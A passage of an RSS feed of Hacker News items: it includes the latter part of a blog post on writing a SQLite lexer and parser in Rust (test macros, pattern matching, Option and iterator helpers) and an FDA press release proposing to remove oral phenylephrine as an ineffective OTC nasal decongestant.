</span></span><span><span>19</span><span>            <span>let</span> <span>mut</span> l <span>=</span> lexer::Lexer::new(<span>&amp;</span>input, <span>"parser_test_fail"</span>);
</span></span><span><span>20</span><span>            <span>let</span> toks <span>=</span> l.run();
</span></span><span><span>21</span><span>            assert_eq!(l.errors.len(), <span>0</span>);
</span></span><span><span>22</span><span>            <span>let</span> <span>mut</span> parser <span>=</span> Parser::new(toks, <span>"parser_test_fail"</span>);
</span></span><span><span>23</span><span>            <span>let</span> _ <span>=</span> parser.parse();
</span></span><span><span>24</span><span>            assert_ne!(parser.errors.len(), <span>0</span>);
</span></span><span><span>25</span><span>        }
</span></span><span><span>26</span><span>    }
</span></span><span><span>27</span><span>}
</span></span></code></pre></div><p>The <code>test_group_fail!</code> macro also extends the same macro from the <code>lexer</code>
module and appends the check for errors after parsing. Both <code>macro_rules!</code>:</p><div><pre tabindex="0"><code data-lang="rust"><span><span> 1</span><span>macro_rules<span>!</span> test_group_pass_assert {
</span></span><span><span> 2</span><span>    (<span>$group_name</span>:<span>ident</span>,<span>$($ident</span>:<span>ident</span>:<span>$input</span>:<span>literal</span><span>=</span><span>$expected</span>:<span>expr</span>),<span>*</span>) <span>=&gt;</span> {
</span></span><span><span> 3</span><span>    <span>mod</span> <span>$group_name</span> {
</span></span><span><span> 4</span><span>        <span>use</span> <span>crate</span>::{lexer, parser::Parser, types::Type, types::Keyword};
</span></span><span><span> 5</span><span>        <span>$(</span>
</span></span><span><span> 6</span><span>            <span>#[test]</span>
</span></span><span><span> 7</span><span>            <span>fn</span> <span>$ident</span>() {
</span></span><span><span> 8</span><span>                <span>let</span> input <span>=</span> <span>$input</span>.as_bytes().to_vec();
</span></span><span><span> 9</span><span>                <span>let</span> <span>mut</span> l <span>=</span> lexer::Lexer::new(<span>&amp;</span>input, <span>"parser_test_pass"</span>);
</span></span><span><span>10</span><span>                <span>let</span> toks <span>=</span> l.run();
</span></span><span><span>11</span><span>                assert_eq!(l.errors.len(), <span>0</span>);
</span></span><span><span>12</span><span>
</span></span><span><span>13</span><span>                <span>let</span> <span>mut</span> parser <span>=</span> Parser::new(toks, <span>"parser_test_pass"</span>);
</span></span><span><span>14</span><span>                <span>let</span> ast <span>=</span> parser.parse();
</span></span><span><span>15</span><span>                assert_eq!(parser.errors.len(), <span>0</span>);
</span></span><span><span>16</span><span>                assert_eq!(ast.into_iter()
</span></span><span><span>17</span><span>                    .map(<span>|</span>o<span>|</span> o.unwrap().token().ttype.clone())
</span></span><span><span>18</span><span>                    .collect::<span>&lt;</span><span>Vec</span><span>&lt;</span>Type<span>&gt;&gt;</span>(), <span>$expected</span>);
</span></span><span><span>19</span><span>            }
</span></span><span><span>20</span><span>        )<span>*</span>
</span></span><span><span>21</span><span>        }
</span></span><span><span>22</span><span>    };
</span></span><span><span>23</span><span>}
</span></span><span><span>24</span><span>
</span></span><span><span>25</span><span>macro_rules<span>!</span> test_group_fail {
</span></span><span><span>26</span><span>    (<span>$group_name</span>:<span>ident</span>,<span>$($ident</span>:<span>ident</span>:<span>$input</span>:<span>literal</span>),<span>*</span>) <span>=&gt;</span> {
</span></span><span><span>27</span><span>    <span>mod</span> <span>$group_name</span> {
</span></span><span><span>28</span><span>        <span>use</span> <span>crate</span>::{lexer, parser::Parser};
</span></span><span><span>29</span><span>        <span>$(</span>
</span></span><span><span>30</span><span>            <span>#[test]</span>
</span></span><span><span>31</span><span>            <span>fn</span> <span>$ident</span>() {
</span></span><span><span>32</span><span>                <span>let</span> input <span>=</span> <span>$input</span>.as_bytes().to_vec();
</span></span><span><span>33</span><span>                <span>let</span> <span>mut</span> l <span>=</span> lexer::Lexer::new(<span>&amp;</span>input, <span>"parser_test_fail"</span>);
</span></span><span><span>34</span><span>                <span>let</span> toks <span>=</span> l.run();
</span></span><span><span>35</span><span>                assert_eq!(l.errors.len(), <span>0</span>);
</span></span><span><span>36</span><span>
</span></span><span><span>37</span><span>                <span>let</span> <span>mut</span> parser <span>=</span> Parser::new(toks, <span>"parser_test_fail"</span>);
</span></span><span><span>38</span><span>                <span>let</span> _ <span>=</span> parser.parse();
</span></span><span><span>39</span><span>                assert_ne!(parser.errors.len(), <span>0</span>);
</span></span><span><span>40</span><span>            }
</span></span><span><span>41</span><span>        )<span>*</span>
</span></span><span><span>42</span><span>        }
</span></span><span><span>43</span><span>    };
</span></span><span><span>44</span><span>}
</span></span></code></pre></div><h3 id="macro-pitfalls">Macro Pitfalls</h3><ul><li><code>rust-analyzer</code> plays badly inside <code>macro_rules!</code><ul><li>no real intellisense</li><li>no goto definition</li><li>no hover for signatures of literals and language constructs</li></ul></li><li><code>cargo fmt</code> does not format or indent inside of <code>macro_rules!</code> and macro invokations</li><li><code>treesitter</code> (yes I use neovim, btw 😼) and <code>chroma</code> (used on this site)
sometimes struggle with syntax highlighting of <code>macro_rules!</code></li><li>documentation is sparse at best</li></ul><h2 id="matching-characters">Matching Characters</h2><p>When writing a lexer, comparing characters is the part everything else depends
on. Rust makes this enjoyable via the <code>matches!</code> macro and the patterns the
<code>match</code> statement accepts. For instance, checking if the current character is
a valid sqlite number can be done by a simple <code>matches!</code> macro invocation:</p><div><pre tabindex="0"><code data-lang="rust"><span><span> 1</span><span><span>/// Specifically matches https://www.sqlite.org/syntax/numeric-literal.html
</span></span></span><span><span> 2</span><span><span></span><span>fn</span> <span>is_sqlite_num</span>(<span>&amp;</span>self) -&gt; <span>bool</span> {
</span></span><span><span> 3</span><span>    matches!(self.cur(), 
</span></span><span><span> 4</span><span>             <span>// exponent notation with +-
</span></span></span><span><span> 5</span><span><span></span>             <span>'+'</span> <span>|</span> <span>'-'</span> <span>|</span>
</span></span><span><span> 6</span><span>             <span>// sqlite allows for separating numbers by _
</span></span></span><span><span> 7</span><span><span></span>             <span>'_'</span> <span>|</span>
</span></span><span><span> 8</span><span>             <span>// floating point
</span></span></span><span><span> 9</span><span><span></span>             <span>'.'</span> <span>|</span>
</span></span><span><span>10</span><span>             <span>// hexadecimal
</span></span></span><span><span>11</span><span><span></span>             <span>'a'</span><span>..=</span><span>'f'</span> <span>|</span> <span>'A'</span><span>..=</span><span>'F'</span> <span>|</span>
</span></span><span><span>12</span><span>             <span>// decimal
</span></span></span><span><span>13</span><span><span></span>             <span>'0'</span><span>..=</span><span>'9'</span>)
</span></span><span><span>14</span><span>}
</span></span></code></pre></div><p>Similarly testing for identifiers is as easy as the above:</p><div><pre tabindex="0"><code data-lang="rust"><span><span>1</span><span><span>fn</span> <span>is_ident</span>(<span>&amp;</span>self, c: <span>char</span>) -&gt; <span>bool</span> {
</span></span><span><span>2</span><span>    matches!(c, <span>'a'</span><span>..=</span><span>'z'</span> <span>|</span> <span>'A'</span><span>..=</span><span>'Z'</span> <span>|</span> <span>'_'</span> <span>|</span> <span>'0'</span><span>..=</span><span>'9'</span>)
</span></span><span><span>3</span><span>}
</span></span></code></pre></div><p>Symbol detection in the main loop of the lexer works exactly the same:</p><div><pre tabindex="0"><code data-lang="rust"><span><span> 1</span><span><span>pub</span> <span>fn</span> <span>run</span>(<span>&amp;</span><span>mut</span> self) -&gt; <span>Vec</span><span>&lt;</span>Token<span>&gt;</span> {
</span></span><span><span> 2</span><span>    <span>let</span> <span>mut</span> r <span>=</span> vec![];
</span></span><span><span> 3</span><span>    <span>while</span> <span>!</span>self.is_eof() {
</span></span><span><span> 4</span><span>        <span>match</span> self.cur() {
</span></span><span><span> 5</span><span>            <span>// skipping whitespace
</span></span></span><span><span> 6</span><span><span></span>            <span>'\t'</span> <span>|</span> <span>'\r'</span> <span>|</span> <span>' '</span> <span>|</span> <span>'\n'</span> <span>=&gt;</span> {}
</span></span><span><span> 7</span><span>            <span>'*'</span> <span>=&gt;</span> r.push(self.single(Type::Asteriks)),
</span></span><span><span> 8</span><span>            <span>';'</span> <span>=&gt;</span> r.push(self.single(Type::Semicolon)),
</span></span><span><span> 9</span><span>            <span>','</span> <span>=&gt;</span> r.push(self.single(Type::Comma)),
</span></span><span><span>10</span><span>            <span>'%'</span> <span>=&gt;</span> r.push(self.single(Type::Percent)),
</span></span><span><span>11</span><span>            _ <span>=&gt;</span> {
</span></span><span><span>12</span><span>                <span>// omitted error handling for unknown symbols
</span></span></span><span><span>13</span><span><span></span>                panic!(<span>"whoops"</span>);
</span></span><span><span>14</span><span>            } 
</span></span><span><span>15</span><span>        }
</span></span><span><span>16</span><span>        self.advance();
</span></span><span><span>17</span><span>    }
</span></span><span><span>18</span><span>    r
</span></span><span><span>19</span><span>}
</span></span></code></pre></div><p>Patterns in <code>match</code> statement and <code>matches</code> blocks are arguably the most
useful feature of Rust.</p><h2 id="matching-tokens">Matching Tokens</h2><p>Once the lexer converts the character stream into a stream of <code>Token</code> structure
instances with positional and type information, the parser can consume this
stream and produce an abstract syntax tree. The parser has to recognise
patterns in its input by detecting token types. This again is a case where
Rusts <code>match</code> statement shines.</p><p>Each <code>Token</code> contains a <code>t</code> field for its type, see below.</p><div><pre tabindex="0"><code data-lang="rust"><span><span> 1</span><span><span>pub</span> <span>use</span> self::keyword::Keyword;
</span></span><span><span> 2</span><span>
</span></span><span><span> 3</span><span><span>#[derive(Debug, PartialEq, Clone)]</span>
</span></span><span><span> 4</span><span><span>pub</span> <span>enum</span> <span>Type</span> {
</span></span><span><span> 5</span><span>    Keyword(keyword::Keyword),
</span></span><span><span> 6</span><span>    Ident(<span>String</span>),
</span></span><span><span> 7</span><span>    Number(<span>f64</span>),
</span></span><span><span> 8</span><span>    <span>String</span>(<span>String</span>),
</span></span><span><span> 9</span><span>    Blob(<span>Vec</span><span>&lt;</span><span>u8</span><span>&gt;</span>),
</span></span><span><span>10</span><span>    Boolean(<span>bool</span>),
</span></span><span><span>11</span><span>    ParamName(<span>String</span>),
</span></span><span><span>12</span><span>    Param(<span>usize</span>),
</span></span><span><span>13</span><span>
</span></span><span><span>14</span><span>    Dot,
</span></span><span><span>15</span><span>    Asteriks,
</span></span><span><span>16</span><span>    Semicolon,
</span></span><span><span>17</span><span>    Percent,
</span></span><span><span>18</span><span>    Comma,
</span></span><span><span>19</span><span>
</span></span><span><span>20</span><span>    Eof,
</span></span><span><span>21</span><span>}
</span></span></code></pre></div><p>Lets look at the <code>sql_stmt_prefix</code> method of the parser. This function parses
the <code>EXPLAIN</code> statement, which - according to the sqlite documentation -
prefixes all other sql statements, hence the name. The corresponding syntax
diagram is shown below:</p><p><img src="https://xnacly.me/rust_lex_parse/sql_stmt.png" alt="sql_stmt syntax diagram"></p><p>The implementation follows this diagram. The <code>Explain</code> stmt is optional, thus
if the current token type does not match <code>Type::Keyword(Keyword::EXPLAIN)</code>, we
call the <code>sql_stmt</code> function to processes the statements on the right of
the syntax diagram.</p><p>If the token matches it gets consumed and the next check is for the second
possible path in the <code>EXPLAIN</code> diagram: <code>QUERY PLAN</code>. This requires both the
<code>QUERY</code> and the <code>PLAN</code> keywords consecutively - both are consumed.</p><div><pre tabindex="0"><code data-lang="rust"><span><span> 1</span><span><span>impl</span><span>&lt;</span><span>'a</span><span>&gt;</span> Parser<span>&lt;</span><span>'a</span><span>&gt;</span> {
</span></span><span><span> 2</span><span>    <span>fn</span> <span>sql_stmt_prefix</span>(<span>&amp;</span><span>mut</span> self) -&gt; <span>Option</span><span>&lt;</span><span>Box</span><span>&lt;</span><span>dyn</span> Node<span>&gt;&gt;</span> {
</span></span><span><span> 3</span><span>        <span>match</span> self.cur()<span>?</span>.ttype {
</span></span><span><span> 4</span><span>            Type::Keyword(Keyword::<span>EXPLAIN</span>) <span>=&gt;</span> {
</span></span><span><span> 5</span><span>                <span>let</span> <span>mut</span> e <span>=</span> Explain {
</span></span><span><span> 6</span><span>                    t: <span>self</span>.cur()<span>?</span>.clone(),
</span></span><span><span> 7</span><span>                    child: <span>None</span>,
</span></span><span><span> 8</span><span>                };
</span></span><span><span> 9</span><span>                self.advance(); <span>// skip EXPLAIN
</span></span></span><span><span>10</span><span><span></span>
</span></span><span><span>11</span><span>                <span>// path for EXPLAIN-&gt;QUERY-&gt;PLAN
</span></span></span><span><span>12</span><span><span></span>                <span>if</span> self.is(Type::Keyword(Keyword::<span>QUERY</span>)) {
</span></span><span><span>13</span><span>                    self.consume(Type::Keyword(Keyword::<span>QUERY</span>));
</span></span><span><span>14</span><span>                    self.consume(Type::Keyword(Keyword::<span>PLAN</span>));
</span></span><span><span>15</span><span>                } <span>// else path is EXPLAIN-&gt;*_stmt
</span></span></span><span><span>16</span><span><span></span>
</span></span><span><span>17</span><span>                e.child <span>=</span> self.sql_stmt();
</span></span><span><span>18</span><span>                <span>Some</span>(<span>Box</span>::new(e))
</span></span><span><span>19</span><span>            }
</span></span><span><span>20</span><span>            _ <span>=&gt;</span> self.sql_stmt(),
</span></span><span><span>21</span><span>        }
</span></span><span><span>22</span><span>    }
</span></span><span><span>23</span><span>}
</span></span></code></pre></div><p>This shows the basic usage of pattern matching in the parser. An other
example is the <code>literal_value</code> function, its sole purpose is to create the
<code>Literal</code> node for all literals.</p><p><img src="https://xnacly.me/rust_lex_parse/literal_value.png" alt="literal_value syntax diagram"></p><p>It discards most embedded enum values, but checks for some specific keywords,
because they are considered keywords, while being literals:</p><div><pre tabindex="0"><code data-lang="rust"><span><span> 1</span><span><span>impl</span><span>&lt;</span><span>'a</span><span>&gt;</span> Parser<span>&lt;</span><span>'a</span><span>&gt;</span> {
</span></span><span><span> 2</span><span>    <span>/// see: https://www.sqlite.org/syntax/literal-value.html
</span></span></span><span><span> 3</span><span><span></span>    <span>fn</span> <span>literal_value</span>(<span>&amp;</span><span>mut</span> self) -&gt; <span>Option</span><span>&lt;</span><span>Box</span><span>&lt;</span><span>dyn</span> Node<span>&gt;&gt;</span> {
</span></span><span><span> 4</span><span>        <span>let</span> cur <span>=</span> self.cur()<span>?</span>;
</span></span><span><span> 5</span><span>        <span>match</span> cur.ttype {
</span></span><span><span> 6</span><span>            Type::<span>String</span>(_)
</span></span><span><span> 7</span><span>            <span>|</span> Type::Number(_)
</span></span><span><span> 8</span><span>            <span>|</span> Type::Blob(_)
</span></span><span><span> 9</span><span>            <span>|</span> Type::Keyword(Keyword::<span>NULL</span>)
</span></span><span><span>10</span><span>            <span>|</span> Type::Boolean(_)
</span></span><span><span>11</span><span>            <span>|</span> Type::Keyword(Keyword::<span>CURRENT_TIME</span>)
</span></span><span><span>12</span><span>            <span>|</span> Type::Keyword(Keyword::<span>CURRENT_DATE</span>)
</span></span><span><span>13</span><span>            <span>|</span> Type::Keyword(Keyword::<span>CURRENT_TIMESTAMP</span>) <span>=&gt;</span> {
</span></span><span><span>14</span><span>                <span>let</span> s: <span>Option</span><span>&lt;</span><span>Box</span><span>&lt;</span><span>dyn</span> Node<span>&gt;&gt;</span> <span>=</span> <span>Some</span>(<span>Box</span>::new(Literal { t: <span>cur</span>.clone() }));
</span></span><span><span>15</span><span>                self.advance();
</span></span><span><span>16</span><span>                s
</span></span><span><span>17</span><span>            }
</span></span><span><span>18</span><span>            _ <span>=&gt;</span> {
</span></span><span><span>19</span><span>                <span>// omitted error handling for invalid literals
</span></span></span><span><span>20</span><span><span></span>                panic!(<span>"whoops"</span>);
</span></span><span><span>21</span><span>            }
</span></span><span><span>22</span><span>        }
</span></span><span><span>23</span><span>    }
</span></span><span><span>24</span><span>}
</span></span></code></pre></div><h2 id="fancy-error-display">Fancy error display</h2><blockquote><p>While the implementation itself is repetitive and not that interesting, I still
wanted to showcase the way both the lexer and the parser handle errors and how
these errors are displayed to the user. A typical error would be to miss a
semicolon at the end of a sql statement:</p><div><pre tabindex="0"><code data-lang="sql"><span><span>1</span><span><span>-- ./vacuum.sql
</span></span></span><span><span>2</span><span><span>-- rebuilding the database into a new file
</span></span></span><span><span>3</span><span><span></span><span>VACUUM</span> <span>INTO</span> <span>'optimized.db'</span>
</span></span></code></pre></div><p>Passing this file to <code>sqleibniz</code> promptly errors:</p><p><img src="https://xnacly.me/rust_lex_parse/vacuum_err.png" alt="vacuum error"></p></blockquote><h2 id="optionals">Optionals</h2><p>Rust error handling is fun to do and propagation with the <code>?</code>-Operator just
makes sense. But Rust goes even further, not only can I modify the value inside
of the <code>Option</code> if there is one, I can even check conditions or provide default
values.</p><h3 id="is_some_and">is_some_and</h3><p>Sometimes you simply need to check if the next character of the input stream
is available and passes a predicate. <code>is_some_and</code> exists for this reason:</p><div><pre tabindex="0"><code data-lang="rust"><span><span>1</span><span><span>fn</span> <span>next_is</span>(<span>&amp;</span><span>mut</span> self, c: <span>char</span>) -&gt; <span>bool</span> {
</span></span><span><span>2</span><span>    self.source
</span></span><span><span>3</span><span>        .get(self.pos <span>+</span> <span>1</span>)
</span></span><span><span>4</span><span>        .is_some_and(<span>|</span>cc<span>|</span> <span>*</span>cc <span>==</span> c <span>as</span> <span>u8</span>)
</span></span><span><span>5</span><span>}
</span></span><span><span>6</span><span>
</span></span><span><span>7</span><span><span>fn</span> <span>is</span>(<span>&amp;</span>self, c: <span>char</span>) -&gt; <span>bool</span> {
</span></span><span><span>8</span><span>    self.source.get(self.pos).is_some_and(<span>|</span>cc<span>|</span> <span>*</span>cc <span>as</span> <span>char</span> <span>==</span> c)
</span></span><span><span>9</span><span>}
</span></span></code></pre></div><p>The above is really nice to read, the following not so much:</p><div><pre tabindex="0"><code data-lang="rust"><span><span> 1</span><span><span>fn</span> <span>next_is</span>(<span>&amp;</span><span>mut</span> self, c: <span>char</span>) -&gt; <span>bool</span> {
</span></span><span><span> 2</span><span>    <span>match</span> self.source.get(self.pos <span>+</span> <span>1</span>) {
</span></span><span><span> 3</span><span>        <span>Some</span>(cc) <span>=&gt;</span> <span>*</span>cc <span>==</span> c <span>as</span> <span>u8</span>,
</span></span><span><span> 4</span><span>        _ <span>=&gt;</span> <span>false</span>,
</span></span><span><span> 5</span><span>    }
</span></span><span><span> 6</span><span>}
</span></span><span><span> 7</span><span>
</span></span><span><span> 8</span><span><span>fn</span> <span>is</span>(<span>&amp;</span>self, c: <span>char</span>) -&gt; <span>bool</span> {
</span></span><span><span> 9</span><span>    <span>match</span> self.source.get(self.pos) {
</span></span><span><span>10</span><span>        <span>Some</span>(cc) <span>=&gt;</span> <span>*</span>cc <span>as</span> <span>char</span> <span>==</span> c,
</span></span><span><span>11</span><span>        _ <span>=&gt;</span> <span>false</span>,
</span></span><span><span>12</span><span>    }
</span></span><span><span>13</span><span>}
</span></span></code></pre></div><h3 id="map">map</h3><p>Since the input is a Vector of <code>u8</code>, not a Vector of <code>char</code>, this conversion is done with <code>map</code>:</p><div><pre tabindex="0"><code data-lang="rust"><span><span>1</span><span><span>fn</span> <span>next</span>(<span>&amp;</span>self) -&gt; <span>Option</span><span>&lt;</span><span>char</span><span>&gt;</span> {
</span></span><span><span>2</span><span>    self.source.get(self.pos <span>+</span> <span>1</span>).map(<span>|</span>c<span>|</span> <span>*</span>c <span>as</span> <span>char</span>)
</span></span><span><span>3</span><span>}
</span></span></code></pre></div><p>Instead of unwrapping and rewrapping the updated value:</p><div><pre tabindex="0"><code data-lang="rust"><span><span>1</span><span><span>fn</span> <span>next</span>(<span>&amp;</span>self) -&gt; <span>Option</span><span>&lt;</span><span>char</span><span>&gt;</span> {
</span></span><span><span>2</span><span>    <span>match</span> self.source.get(self.pos <span>+</span> <span>1</span>) {
</span></span><span><span>3</span><span>        <span>Some</span>(c) <span>=&gt;</span> <span>Some</span>(<span>*</span>c <span>as</span> <span>char</span>),
</span></span><span><span>4</span><span>        _ <span>=&gt;</span> <span>None</span>,
</span></span><span><span>5</span><span>    }
</span></span><span><span>6</span><span>}
</span></span></code></pre></div><h3 id="map_or">map_or</h3><p>In a similar fashion, the sqleibniz parser uses <code>map_or</code> to return
the check for a type, but only if the current token is <code>Some</code>:</p><div><pre tabindex="0"><code data-lang="rust"><span><span>1</span><span><span>fn</span> <span>next_is</span>(<span>&amp;</span>self, t: <span>Type</span>) -&gt; <span>bool</span> {
</span></span><span><span>2</span><span>    self.tokens
</span></span><span><span>3</span><span>        .get(self.pos <span>+</span> <span>1</span>)
</span></span><span><span>4</span><span>        .map_or(<span>false</span>, <span>|</span>tok<span>|</span> tok.ttype <span>==</span> t)
</span></span><span><span>5</span><span>}
</span></span><span><span>6</span><span>
</span></span><span><span>7</span><span><span>fn</span> <span>is</span>(<span>&amp;</span>self, t: <span>Type</span>) -&gt; <span>bool</span> {
</span></span><span><span>8</span><span>    self.cur().map_or(<span>false</span>, <span>|</span>tok<span>|</span> tok.ttype <span>==</span> t)
</span></span><span><span>9</span><span>}
</span></span></code></pre></div><p>Again, replacing the not so idiomatic solutions:</p><div><pre tabindex="0"><code data-lang="rust"><span><span> 1</span><span><span>fn</span> <span>next_is</span>(<span>&amp;</span>self, t: <span>Type</span>) -&gt; <span>bool</span> {
</span></span><span><span> 2</span><span>    <span>match</span> self.tokens.get(self.pos <span>+</span> <span>1</span>) {
</span></span><span><span> 3</span><span>        <span>None</span> <span>=&gt;</span> <span>false</span>,
</span></span><span><span> 4</span><span>        <span>Some</span>(token) <span>=&gt;</span> token.ttype <span>==</span> t,
</span></span><span><span> 5</span><span>    }
</span></span><span><span> 6</span><span>}
</span></span><span><span> 7</span><span>
</span></span><span><span> 8</span><span><span>fn</span> <span>is</span>(<span>&amp;</span>self, t: <span>Type</span>) -&gt; <span>bool</span> {
</span></span><span><span> 9</span><span>    <span>if</span> <span>let</span> <span>Some</span>(tt) <span>=</span> self.cur() {
</span></span><span><span>10</span><span>        <span>return</span> tt.ttype <span>==</span> t;
</span></span><span><span>11</span><span>    }
</span></span><span><span>12</span><span>    <span>false</span>
</span></span><span><span>13</span><span>}
</span></span></code></pre></div><h2 id="iterators-">Iterators 💖</h2><h3 id="filtering-characters">Filtering characters</h3><p>Rust number parsing does not allow <code>_</code>, sqlite number parsing
accepts <code>_</code>, thus the lexer also consumes them, but filters these
characters before parsing the input via the rust number parsing
logic:</p><div><pre tabindex="0"><code data-lang="rust"><span><span>1</span><span><span>let</span> <span>str</span> <span>=</span> self
</span></span><span><span>2</span><span>    .source
</span></span><span><span>3</span><span>    .get(start<span>..</span>self.pos)
</span></span><span><span>4</span><span>    .unwrap_or_default()
</span></span><span><span>5</span><span>    .iter()
</span></span><span><span>6</span><span>    .map(<span>|</span>c<span>|</span> <span>*</span>c <span>as</span> <span>char</span>)
</span></span><span><span>7</span><span>    .filter(<span>|</span>c<span>|</span> <span>*</span>c <span>!=</span> <span>'_'</span>)
</span></span><span><span>8</span><span>    .collect::<span>&lt;</span><span>String</span><span>&gt;</span>();
</span></span></code></pre></div><div id="callout"><h3>Tip</h3><p>I know you aren’t supposed to use <code>unwrap</code> and all derivates,
however in this situation the parser either way does not accept
empty strings as valid numbers, thus it will fail either way on
the default value.</p></div><p>In go i would have to first iterate the character list with a for
loop and write each byte into a string buffer (in which each write
could fail btw, or at least can return an <code>error</code>) and afterwards
I have to create a <code>string</code> from the <code>strings.Builder</code> structure.</p><div><pre tabindex="0"><code data-lang="go"><span><span>1</span><span>s <span>:=</span> source[start:l.pos]
</span></span><span><span>2</span><span>b <span>:=</span> strings.Builder{}
</span></span><span><span>3</span><span>b.<span>Grow</span>(<span>len</span>(s))
</span></span><span><span>4</span><span><span>for</span> _, c <span>:=</span> <span>range</span> s {
</span></span><span><span>5</span><span>    <span>if</span> c <span>!=</span> <span>'_'</span> {
</span></span><span><span>6</span><span>        b.<span>WriteByte</span>(c)
</span></span><span><span>7</span><span>    }
</span></span><span><span>8</span><span>}
</span></span><span><span>9</span><span>s = b.<span>String</span>()
</span></span></code></pre></div><h3 id="checking-characters">Checking characters</h3><p>Sqlite accepts hexadecimal data as blobs: <code>x'&lt;hex&gt;'</code>, to verify
the input is correct, I have to check every character in this
array to be a valid hexadecimal. Furthermore I need positional
information for correct error display, for this I reuse the
<code>self.string()</code> method and use the <code>chars()</code> iterator creating
function and the <code>enumerate</code> function.</p><div><pre tabindex="0"><code data-lang="rust"><span><span> 1</span><span><span>if</span> <span>let</span> <span>Ok</span>(str_tok) <span>=</span> self.string() {
</span></span><span><span> 2</span><span>    <span>if</span> <span>let</span> Type::<span>String</span>(<span>str</span>) <span>=</span> <span>&amp;</span>str_tok.ttype {
</span></span><span><span> 3</span><span>        <span>let</span> <span>mut</span> had_bad_hex <span>=</span> <span>false</span>;
</span></span><span><span> 4</span><span>        <span>for</span> (idx, c) <span>in</span> <span>str</span>.chars().enumerate() {
</span></span><span><span> 5</span><span>            <span>if</span> <span>!</span>c.is_ascii_hexdigit() {
</span></span><span><span> 6</span><span>                <span>// error creation and so on omitted here 
</span></span></span><span><span> 7</span><span><span></span>                had_bad_hex <span>=</span> <span>true</span>;
</span></span><span><span> 8</span><span>                <span>break</span>;
</span></span><span><span> 9</span><span>            }
</span></span><span><span>10</span><span>        }
</span></span><span><span>11</span><span>        <span>if</span> had_bad_hex {
</span></span><span><span>12</span><span>            <span>break</span>;
</span></span><span><span>13</span><span>        }
</span></span><span><span>14</span><span>
</span></span><span><span>15</span><span>        <span>// valid hexadecimal data in blob
</span></span></span><span><span>16</span><span><span></span>    }
</span></span><span><span>17</span><span>} <span>else</span> {
</span></span><span><span>18</span><span>    <span>// error handling omitted
</span></span></span><span><span>19</span><span><span></span>}
</span></span></code></pre></div><p>The error display produces the following error if an invalid
character inside of a blob is found:</p><p><img src="https://xnacly.me/rust_lex_parse/bad_blob.png" alt="invalid blob data"></p><div id="callout"><h3>Info</h3><p>Thanks for reading this far 😼.</p><p>If you found an error (technical or semantic), please email me a nudge in the
right direction at <a href="mailto://contact@xnacly.me">contact@xnacly.me</a>
(<code>contact@xnacly.me</code>).</p></div></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Guild Builds (128 pts)]]></title>
            <link>https://nytimesguild.org/tech/guild-builds/index.html</link>
            <guid>42083292</guid>
            <pubDate>Fri, 08 Nov 2024 01:47:01 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://nytimesguild.org/tech/guild-builds/index.html">https://nytimesguild.org/tech/guild-builds/index.html</a>, See on <a href="https://news.ycombinator.com/item?id=42083292">Hacker News</a></p>
<div id="readability-page-1" class="page"><div data-astro-cid-sh445jdo="">  <h2 data-astro-cid-azbpcp4f=""> We heard you like cooking. Here’s our cookbook. </h2>     </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[FDA Proposes Ending Use of Oral Phenylephrine as OTC Nasal Decongestant (203 pts)]]></title>
            <link>https://www.fda.gov/news-events/press-announcements/fda-proposes-ending-use-oral-phenylephrine-otc-monograph-nasal-decongestant-active-ingredient-after</link>
            <guid>42082998</guid>
            <pubDate>Fri, 08 Nov 2024 00:56:49 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.fda.gov/news-events/press-announcements/fda-proposes-ending-use-oral-phenylephrine-otc-monograph-nasal-decongestant-active-ingredient-after">https://www.fda.gov/news-events/press-announcements/fda-proposes-ending-use-oral-phenylephrine-otc-monograph-nasal-decongestant-active-ingredient-after</a>, See on <a href="https://news.ycombinator.com/item?id=42082998">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>

                                 <article id="main-content" role="article">
          
                                                                <header role="heading" aria-level="1">
                         






                      </header>
                              
                                                                           <div role="main">

                            
                            
                            
                            
                                              
    <div>
    <dl>
        <dt>For Immediate Release:</dt>
                  <dd><time datetime="2024-11-07T14:00:00Z">November 07, 2024</time>
</dd>
                 
                
      </dl>
    </div>
 

  
      
       

  <p>Today, the U.S. Food and Drug Administration announced it is proposing to remove oral phenylephrine as an active ingredient that can be used in over-the-counter (OTC) monograph drug products for the temporary relief of nasal congestion after an agency review of the available data determined that oral phenylephrine is not effective for this use. For now, companies may continue to market OTC monograph drug products containing oral phenylephrine as a nasal decongestant. This is a <a href="https://dps.fda.gov/omuf/ordersearch/order_otc000036">proposed order</a>. Only a final order will affect what products can be marketed. The proposed order is based on effectiveness concerns, not on safety concerns.&nbsp;</p>

<p>Currently, oral phenylephrine is widely used as a nasal decongestant active ingredient in many OTC monograph drug products. It is important to note that some products only contain oral phenylephrine as a single, active ingredient. Others contain oral phenylephrine and another active ingredient (e.g., acetaminophen or dextromethorphan), and the presence of oral phenylephrine in these medicines does not affect how other active ingredients work to treat the symptoms for which they are intended.&nbsp;</p>

<p><strong>“It is the FDA’s role to ensure that drugs are safe and effective,” said Patrizia Cavazzoni, M.D., director of the FDA’s Center for Drug Evaluation and Research (CDER). “Based on our review of available data, and consistent with the advice of the advisory committee, we are taking this next step in the process to propose removing oral phenylephrine because it is not effective as a nasal decongestant.”</strong></p>

<p>The agency conducted a comprehensive review of all available data on the safety and efficacy of oral phenylephrine, including the historical data that were used to support the determination made 30 years ago that oral phenylephrine was effective as a nasal decongestant, as well as newer clinical data on oral phenylephrine that have since become available.&nbsp;</p>

<p>Last fall, the FDA also held a Nonprescription Drug Advisory Committee meeting to discuss the ‘Generally Recognized as Safe and Effective’ (GRASE) status of oral phenylephrine as a nasal decongestant. The committee discussed new data on the effectiveness of orally administered phenylephrine and unanimously concluded that the current scientific data do not support that the recommended dosage in the OTC cold, cough, allergy, bronchodilator and antiasthmatic drug products monograph for orally administered phenylephrine’s effectiveness as a nasal decongestant.</p>

<p><strong>“Consumers should know that a range of safe and effective drugs and other treatments is available to temporarily relieve congestion symptoms due to allergies or a common cold,” said Theresa Michele, M.D., director of the Office of Nonprescription Drug Products in CDER. “Consumers can also talk to their doctor or pharmacist about ways to treat these symptoms.”</strong></p>

<p>Because a variety of different drug products may be sold under the same brand name, consumers should always read the Drug Facts label to determine which ingredients are in a medication, and to be aware of important warnings and directions for use. Phenylephrine is also an ingredient in nasal sprays to treat congestion. The FDA’s action is only related to orally administered phenylephrine and not the nasal spray form.</p>

